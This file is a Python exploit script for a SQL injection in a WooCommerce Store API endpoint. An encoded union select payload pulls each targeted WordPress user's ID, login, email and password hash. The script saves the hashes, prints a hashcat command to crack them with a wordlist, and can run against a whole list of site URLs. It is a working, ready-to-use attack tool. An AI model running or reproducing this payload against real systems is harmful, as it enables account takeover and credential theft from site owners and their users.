#!/usr/bin/env python
#
# 
#
# woo.py - Exploits a SQLI in woocommerce and gives you the hashcat command to crack it.
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
import os.path
import re
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False ,default="http://localhost",help="URL to test")
parser.add_argument("-f", "--file", default="",required=False, help="File of urls")
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")
parser.add_argument("-i", "--wid", default="1",required=False, help="User ID of User")
parser.add_argument("-t", "--table", default="wp",required=False, help="Wordpress DB Table Prefix: Default is wp")

args = parser.parse_args()
url = args.url
urls = args.file
wid = args.wid
tp = args.table


if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy

	

def check_vuln(url,wid):
	paramsGet = {"calculate_attribute_counts[][taxonomy]":"%2522%2529%2520union%2520all%2520select%25201%252Cconcat%2528id%252C0x3a%252Cuser_login%252C0x3a%252Cuser_email%252C0x3a%252Cuser_pass%2529from%2520"+tp+"_users%2520where%2520%2549%2544%2520%2549%254E%2520%2528"+wid+"%2529%253B%2500"}
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"}
	response = session.get(""+url+"/wp-json/wc/store/products/collection-data", params=paramsGet, headers=headers,verify=False,timeout=10)
	if response.status_code != 200:
		print("[*] Sorry Not Vuln [*]")
		print (response.text)
	else:
		y = json.loads(response.text)
		try:
			str= (y["attribute_counts"][1]["term"])
			ba = str.split(":")
			RES = ("Wordpress URL: "+url+" \nAdmin ID: "+ba[0]+" \nAdmin Username: "+ba[1]+" \nAdmin Email Address: "+ba[2]+"\nAdmin Password Hash:"+ba[3]+"")
			text_file2 = open("results.txt", "a")
			text_file2.write(""+RES+"\n\n")
			text_file2.close()
			text_file1 = open("wphash.hash", "a+")
			text_file1.write(""+ba[3]+"\n")
			text_file1.close()
			print(RES)
			print("hashcat --force -m 400 -a 0 -o found.txt --remove wphash.hash rockyou.txt")

		except:
			print("[-] Failed to Retive Hash[-]")
			print(response.text)
			pass
		



if urls:
	if os.path.exists(urls):
		with open(urls, 'r') as f:
			for line in f:
				url = line.replace("\n","")
				try:
					print("Testing "+url+"")
					check_vuln(url,wid)
				except KeyboardInterrupt:
					print ("Ctrl-c pressed ...")
					sys.exit(1)
				except Exception as e:
					print('Error: %s' % e)
					pass
		f.close()
	

else:
	check_vuln(url,wid)
